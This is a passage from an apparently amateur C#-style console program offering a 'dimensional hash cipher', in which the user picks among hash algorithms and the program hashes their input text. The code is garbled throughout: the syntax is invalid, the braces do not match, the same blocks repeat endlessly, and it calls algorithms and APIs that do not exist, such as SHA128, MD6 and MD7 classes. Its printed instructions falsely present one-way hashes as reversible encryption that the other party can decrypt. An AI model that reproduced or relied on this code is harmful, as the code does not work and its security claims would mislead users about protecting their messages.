																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 4];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 5];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 8];

																																																																																																																																																							}
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int4 || _inputDecision2 == _int4 || _inputDecision3 == _int4 || _inputDecision4 == _int4 || _inputDecision5 == _int4 || _inputDecision6 == _int4 || _inputDecision7 == _int4 || _inputDecision8 == _int4 ||
																																																																																																																																																							_inputDecision9 == _int4){

																																																																																																																																																																																																																																		string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];

																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int4) == true){


																																																																																																																																																								_disArray.Ammend[string "f" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 2];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 4];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 6];
																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 8];

																																																																																																																																																							}
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int5 || _inputDecision2 == _int5 || _inputDecision3 == _int5 || _inputDecision4 == _int5 || _inputDecision5 == _int5 || _inputDecision6 == _int5 || _inputDecision7 == _int5 || _inputDecision8 == _int5 ||
																																																																																																																																																							_inputDecision9 == _int5){


																																																																																																																																																																																																																																		string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 0];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 4];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 8];

																																																																																																																																																							}
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int6 || _inputDecision2 == _int6 || _inputDecision3 == _int6 || _inputDecision4 == _int6 || _inputDecision5 == _int6 || _inputDecision6 == _int6 || _inputDecision7 == _int6 || _inputDecision8 == _int6 ||
																																																																																																																																																							_inputDecision9 == _int6){


																																																																																																																																																																																																																																		string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 1];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 2];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int6) == true){


																																																																																																																																																								_disArray.Ammend[string "z" : 3];



																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int6) == true){



																																																																																																																																																								_disArray.Ammend[string "z" : 4];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 5];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 8];

																																																																																																																																																							}
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else{

																																																																																																																																																							System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																						}


																																																																																																																																																						System.Console.WriteLine("Plvse Input The Text You Wish To Hvve Encoded In Your 5 Bvse Dimensionvl Vlgorithmic Hvsh Cipher: ");
																																																																																																																																																						string _CipherPreText = System.Console.ReadLine();

																																																																																																																																																						for(_codexstring[0]){

																																																																																																																																																							if(_codexstring[0] == "c"){
																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																									public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																									public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																									return _shvfunc;

																																																																																																																																																								}

																																																																																																																																																							}

																																																																																																																																																							else if(_codexstring[0] == "d"){
																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																									public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																									public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																									return _shvfunc;

																																																																																																																																																								}
																																																																																																																																																								else if(_codexstring[0] == "e"){
																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																										public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																										public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																										return _shvfunc;

																																																																																																																																																									}
																																																																																																																																																									else if(_codexstring[0] == "f"){
																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																											public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																											public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																											return _shvfunc;

																																																																																																																																																										}
																																																																																																																																																										else if(_codexstring[0] == "G"){
																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																												public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																												public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																												return _shvfunc;

																																																																																																																																																											}
																																																																																																																																																											else if(_codexstring[0] == "z"){
																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																													public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																													public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																													return _shvfunc;

																																																																																																																																																												}
																																																																																																																																																												else{

																																																																																																																																																													System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																												}



																																																																																																																																																											}
																																																																																																																																																											for(_codexstring[1]){

																																																																																																																																																												if(_codexstring[1] == "c"){
																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																														public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																														public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																														return _shvfunc;

																																																																																																																																																													}

																																																																																																																																																												}

																																																																																																																																																												else if(_codexstring[1] == "d"){
																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																														public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																														public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																														return _shvfunc;

																																																																																																																																																													}
																																																																																																																																																													else if(_codexstring[1] == "e"){
																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																															public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																															public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																															return _shvfunc;

																																																																																																																																																														}
																																																																																																																																																														else if(_codexstring[1] == "f"){
																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																return _shvfunc;

																																																																																																																																																															}
																																																																																																																																																															else if(_codexstring[1] == "G"){
																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																	public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																	public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																}
																																																																																																																																																																else if(_codexstring[1] == "z"){
																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																		public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																		public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																	}
																																																																																																																																																																	else{

																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																	}



																																																																																																																																																																}
																																																																																																																																																																for(_codexstring[2]){

																																																																																																																																																																	if(_codexstring[2] == "c"){
																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																			public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																			public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																		}

																																																																																																																																																																	}

																																																																																																																																																																	else if(_codexstring[2] == "d"){
																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																			public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																			public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																		}
																																																																																																																																																																		else if(_codexstring[2] == "e"){
																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																				public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																				public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																				return _shvfunc;

																																																																																																																																																																			}
																																																																																																																																																																			else if(_codexstring[2] == "f"){
																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																					public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																					public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																					return _shvfunc;

																																																																																																																																																																				}
																																																																																																																																																																				else if(_codexstring[2] == "G"){
																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																						public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																						public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																						return _shvfunc;

																																																																																																																																																																					}
																																																																																																																																																																					else if(_codexstring[2] == "z"){
																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																							public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																							public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																						}
																																																																																																																																																																						else{
																																																																																																																																																																							System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");



																																																																																																																																																																						}
																																																																																																																																																																					}
																																																																																																																																																																					for(_codexstring[3]){

																																																																																																																																																																						if(_codexstring[3] == "c"){
																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																								public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																								public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																							}

																																																																																																																																																																						}

																																																																																																																																																																						else if(_codexstring[3] == "d"){
																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																								public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																								public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																							}
																																																																																																																																																																							else if(_codexstring[3] == "e"){
																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																									public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																									public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																									return _shvfunc;

																																																																																																																																																																								}
																																																																																																																																																																								else if(_codexstring[3] == "f"){
																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																										public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																										public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																										return _shvfunc;

																																																																																																																																																																									}
																																																																																																																																																																									else if(_codexstring[3] == "G"){
																																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																																											public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																											public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																											return _shvfunc;

																																																																																																																																																																										}
																																																																																																																																																																										else if(_codexstring[3] == "z"){
																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																												public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																												public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																											}
																																																																																																																																																																											else{

																																																																																																																																																																												System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																											}

																																																																																																																																																																										}
																																																																																																																																																																										for(_codexstring[4]){

																																																																																																																																																																											if(_codexstring[4] == "c"){
																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																													public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																													public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																												}

																																																																																																																																																																											}

																																																																																																																																																																											else if(_codexstring[4] == "d"){
																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																													public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																													public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																												}
																																																																																																																																																																												else if(_codexstring[4] == "e"){
																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																														public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																														public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																														return _shvfunc;

																																																																																																																																																																													}
																																																																																																																																																																													else if(_codexstring[4] == "f"){
																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																															public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																															public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																															return _shvfunc;

																																																																																																																																																																														}
																																																																																																																																																																														else if(_codexstring[4] == "G"){
																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																return _shvfunc;

																																																																																																																																																																															}
																																																																																																																																																																															else if(_codexstring[4] == "z"){
																																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																	public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																	public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																																}
																																																																																																																																																																																else{

																																																																																																																																																																																	System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																}

																						



																																																																																																																																																																																																			System.Console.WriteLine("Your Vlgorithed PvssKey Text Comes Out In The 5 Bvse Vlgorithm Chosen To :");
																																																																																																																																																																																System.Console.WriteLine(_shvfunc.ToString());
																																																																																																																																																																																																			System.Console.WriteLine("Plevse Remember The Following Cipher Phrvse For Decryptor Use: " + _codexstring.ToString() + "Vnd Do Not Forget To Include The  5 Bvse Descriptor For Effective Decryption! ");
																																																																																																																																																																																																			System.Console.WriteLine("Your Key Encoding Will Vlso Need To Be Retvined To Be Used For Decryption So If You Chose SHV128, SHV256, SHV512, MD5/6/or 7, Plevse Shvre Thvt To The Other Pvrty Involved ");
																																																																																																																																																																																																			System.Console.WriteLine("In V Privvte Vnd Encrypted Communicvtion Method, However Mvintvin Covervge With PGP, One-Time KeyPhrvse Or Miscellvnious For Vplivble Security In Messvging The Determined Key Encoding.");
																																																																																																																																																																																																			System.Console.WriteLine("Plevse Enjoy The Vlgorithm Vnd Stvy Protected!  - Nvye");
																																																																																																																																																																																																			System.Console.ReadLine();
													}
													else if(_vlgoDecise == "6 Bvse" ){


																																																																																																																																																																																System.Console.WriteLine("Hvving Chosen The 6 Bvse Vlgorithmic Hvshing Function V Word Is In Order... ");
																																																																																																																																																																																System.Console.WriteLine("");
																																																																																																																																																																																System.Console.WriteLine("For The Dimension Listed Within The First Vvrivble, The Choice Of Specific Vlgorithms Will Be Mvde, ");

																																																																																																																																																																																System.Console.WriteLine("The Lvst Leg of The Encryption Bvse Will Provide The Room For The Messvge For Cryptogrvphic Cipher Crevtion.");
																																																																																																																																																																																System.Console.WriteLine(" ");
																																																																																																																																																																																System.Console.WriteLine("First, Plevse Choose The Vlgorithm For Section One of The Hvshing Function: ");
																																																																																																																																																																																System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																																																string array[] _commCrypto = new array["SHA128" , "SHA256" , "SHA512" , "MD5" , "MD6" , "MD7"];

																																																																																																																																																																																string _inputDecision = System.Console.ReadLine();
																																																																																																																																																																																System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Hvshing Function: ");
